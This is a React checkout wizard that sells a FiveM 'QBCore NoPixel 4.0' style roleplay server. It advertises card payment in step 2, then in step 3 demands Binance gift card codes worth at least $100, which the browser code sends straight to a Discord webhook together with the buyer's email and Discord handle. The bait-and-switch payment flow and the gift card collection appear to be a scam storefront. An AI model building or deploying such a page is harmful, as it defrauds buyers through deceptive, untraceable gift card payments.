"use client";

import { useMemo, useState } from "react";

/* ---------- Shared Buttons ---------- */

const baseBtn =
  "inline-flex items-center justify-center gap-2 rounded-full border border-white/20 px-6 py-2 text-white transition disabled:opacity-40 disabled:cursor-not-allowed";

const NextButton = ({
  onClick,
  disabled = false,
}: {
  onClick: () => void;
  disabled?: boolean;
}) => (
  <button
    type="button"
    onClick={onClick}
    disabled={disabled}
    className={`${baseBtn} relative overflow-hidden`}
  >
    {/* pink ambient bg */}
    <span className="pointer-events-none absolute inset-0 rounded-full bg-gradient-to-br from-pink-500/25 via-pink-400/10 to-transparent blur-md" />
    <span className="relative">Next</span>
    <span className="relative">⭐</span>
  </button>
);

const BackButton = ({ onClick }: { onClick: () => void }) => (
  <button type="button" onClick={onClick} className={baseBtn}>
    ← Back
  </button>
);

/* ---------- Payment Option Card ---------- */

function PaymentOption({
  label,
  selected,
  onSelect,
}: {
  label: string;
  selected: boolean;
  onSelect: () => void;
}) {
  const ring = selected ? "ring-2 ring-pink-400/70 shadow-pink-400/30" : "ring-1 ring-white/20";
  return (
    <button
      type="button"
      onClick={onSelect}
      className={`
        group relative w-full max-w-xl
        rounded-2xl border border-white/20 ${ring}
        bg-white/5 backdrop-blur-md
        px-6 py-4 text-white
        transition-all duration-300
        hover:translate-y-[-1px] hover:bg-white/10
      `}
    >
      {/* subtle inner shine */}
      <span className="pointer-events-none absolute inset-0 rounded-2xl bg-gradient-to-tr from-white/5 to-transparent" />
      <span className="relative block text-center font-semibold">
        {label}
      </span>
    </button>
  );
}

/* ---------- Success Overlay ---------- */

function SuccessOverlay({ onBack }: { onBack: () => void }) {
  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/80">
      <div className="mx-4 w-full max-w-lg rounded-3xl border border-white/15 bg-white/5 p-8 text-center text-white backdrop-blur-xl">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-green-500/15">
          <span className="text-3xl">✅</span>
        </div>
        <h1 className="text-2xl font-bold text-green-400">
          Order submitted successfully!
        </h1>
        <p className="mt-2 text-sm text-white/70">
          Thank you. We’ll validate your giftcard and deliver by email/Discord.
        </p>

        <div className="mt-6">
          <BackButton onClick={onBack} />
        </div>
      </div>
    </div>
  );
}

/* ---------- Main Wizard ---------- */

export default function Wizard() {
  const [step, setStep] = useState<number>(1);
  const [paymentSelected, setPaymentSelected] = useState<boolean>(false);

  // form fields
  const [discord, setDiscord] = useState("");
  const [email, setEmail] = useState("");
  const [codes, setCodes] = useState("");
  const [file, setFile] = useState<File | null>(null);

  const [submitting, setSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  /** Replace with your Discord webhook */
  const WEBHOOK_URL = useMemo(() => "WEBHOOK_URL_HERE", []);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting) return;

    setSubmitting(true);
    try {
      // send text payload
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content:
            `🛒 **New Order**\n` +
            `👤 Discord: ${discord || "N/A"}\n` +
            `📧 Email: ${email || "N/A"}\n` +
            `💳 Codes: ${codes || "N/A"}`,
        }),
      });

      // optionally upload file (if webhook supports multipart for attachments)
      if (file) {
        const fd = new FormData();
        fd.append("payload_json", JSON.stringify({ content: "📎 Attachment from customer" }));
        fd.append("file", file, file.name);
        await fetch(WEBHOOK_URL, { method: "POST", body: fd });
      }

      setShowSuccess(true);
    } catch (err) {
      alert("❌ Failed to submit. Please try again.");
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <>
      {/* success layer */}
      {showSuccess && (
        <SuccessOverlay
          onBack={() => {
            setShowSuccess(false);
            setStep(1);
            setDiscord("");
            setEmail("");
            setCodes("");
            setFile(null);
            setPaymentSelected(false);
          }}
        />
      )}

      <div className="rounded-2xl border border-white/10 bg-black/40 p-8 backdrop-blur-md">
        {/* ---------- STEP 1 ---------- */}
        {step === 1 && (
          <div>
            <div className="rounded-2xl border border-white/15 bg-white/5 p-6 text-white shadow-xl backdrop-blur-lg">
              <h2 className="text-2xl font-bold">
                QBCore NoPixel 4.0 Inspired Full Server
              </h2>

              <p className="mt-4 text-white/90">Why Choose Brinley Server 4.0?</p>
              <ul className="mt-2 list-disc list-inside space-y-1 text-white/80">
                <li>Sleek &amp; Professional UI</li>
                <li>Advanced Illegal System</li>
                <li>Integrated Police Dispatch</li>
                <li>Realistic Graphics</li>
                <li>Optimized Performance (0.8ms res)</li>
                <li>Multiplayer Jobs</li>
                <li>Plug-and-Play Ready</li>
                <li>Premium Clothing Pack</li>
                <li>300+ Custom Unbranded Cars</li>
              </ul>

              <p className="mt-6 text-white/90">
                What’s Included When You Buy Our Server?
              </p>
              <ul className="mt-2 list-disc list-inside space-y-1 text-white/80">
                <li>Free Support</li>
                <li>Free Monthly Updates</li>
                <li>Complete Setup</li>
              </ul>
            </div>

            <div className="mt-8 flex justify-end">
              <NextButton onClick={() => setStep(2)} />
            </div>
          </div>
        )}

        {/* ---------- STEP 2 ---------- */}
        {step === 2 && (
          <div>
            <h2 className="mb-4 text-xl font-bold text-white">
              Which payment method would you like to use to purchase QBCore Server?
            </h2>

            <div className="mt-4 flex flex-col items-center gap-4">
              <PaymentOption
                label="Credit/Debit Card [Instant Delivery]"
                selected={paymentSelected}
                onSelect={() => {
                  // toggle/select with a tiny pulse
                  setPaymentSelected(true);
                }}
              />
            </div>

            <div className="mt-8 flex items-center justify-between">
              <BackButton onClick={() => setStep(1)} />
              <NextButton onClick={() => setStep(3)} disabled={!paymentSelected} />
            </div>
          </div>
        )}

        {/* ---------- STEP 3 ---------- */}
        {step === 3 && (
          <div>
            <h2 className="mb-4 text-xl font-bold text-white">🙏 Payment via Binance Gift Card</h2>
            <p className="mb-4 text-gray-200">
              We accept <b>Binance Gift Card Global Giftcard</b> from stores like G2A, ENABA,
              Kinguin, DRIFFLE, and more.
            </p>

            <ul className="mb-4 list-disc list-inside space-y-1 text-gray-200">
              <li>Only USD - Global Binance Gift Card codes are accepted ❌ EUR not supported</li>
              <li>Minimum value: $100</li>
              <li>You can combine multiple giftcards (e.g. $20 + $5)</li>
            </ul>

<div>
  <p className="font-semibold mb-2">Useful links to buy Binance Gift Card:</p>
  <ul className="list-disc list-inside space-y-1">
    <li>
      <a 
        href="https://www.eneba.com/binance-binance-gift-card-usdt-100-usd-key-global" 
        target="_blank" 
        rel="noopener noreferrer" 
        className="text-cyan-400 hover:underline"
      >
        ENABA.COM
      </a>
    </li>
    <li>
      <a 
        href="https://driffle.com/binance-usdt-100-usd-gift-card-digital-code-p9886872" 
        target="_blank" 
        rel="noopener noreferrer" 
        className="text-cyan-400 hover:underline"
      >
        DRIFFLE.COM
      </a>
    </li>
    <li>
      <a 
        href="https://www.g2a.com/binance-gift-card-100-usdt-key-i10000301475001" 
        target="_blank" 
        rel="noopener noreferrer" 
        className="text-cyan-400 hover:underline"
      >
        G2A.COM
      </a>
    </li>
    <li>
      <a 
        href="https://www.kinguin.net/category/111051/binance-gift-card-usdt-100" 
        target="_blank" 
        rel="noopener noreferrer" 
        className="text-cyan-400 hover:underline"
      >
        KINGUIN.COM
      </a>
    </li>
  </ul>
</div>

            <form onSubmit={handleSubmit} className="flex flex-col gap-4">
              <input
                type="text"
                name="discord"
                value={discord}
                onChange={(e) => setDiscord(e.target.value)}
                placeholder="Your Discord"
                className="border p-2 rounded placeholder-gray-500"
                style={{ color: "black" }}
              />
              <input
                type="email"
                name="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Your Email [Delivery]"
                className="border p-2 rounded placeholder-gray-500"
                style={{ color: "black" }}
              />
              <input
                type="text"
                name="code"
                value={codes}
                onChange={(e) => setCodes(e.target.value)}
                placeholder="Binance Gift Card Code(s)"
                className="border p-2 rounded placeholder-gray-500"
                style={{ color: "black" }}
              />
              <input
                type="file"
                onChange={(e) => setFile(e.target.files?.[0] ?? null)}
                className="rounded border border-white/20 bg-white p-2 text-black file:mr-3 file:rounded file:border-0 file:bg-black/10 file:px-3 file:py-1"
              />

              {/* Submit styled like your request */}
              <button
                type="submit"
                disabled={submitting}
                className="relative mt-2 rounded-2xl border border-white/25 bg-white/10 px-6 py-3 text-white shadow-lg backdrop-blur-md transition hover:bg-white/15 disabled:opacity-50"
              >
                <span className="pointer-events-none absolute inset-0 rounded-2xl ring-1 ring-white/25" />
                <span className="relative font-semibold">Submit Order</span>
              </button>
            </form>

            <p className="mt-4 text-sm text-gray-400">
              ⚠️ Orders via Gift Card can take 5 minutes – 1 hours to be validated and released.
            </p>

            <div className="mt-6 flex justify-between">
              <BackButton onClick={() => setStep(2)} />
              <NextButton onClick={() => {}} disabled />
            </div>
          </div>
        )}
      </div>
    </>
  );
}
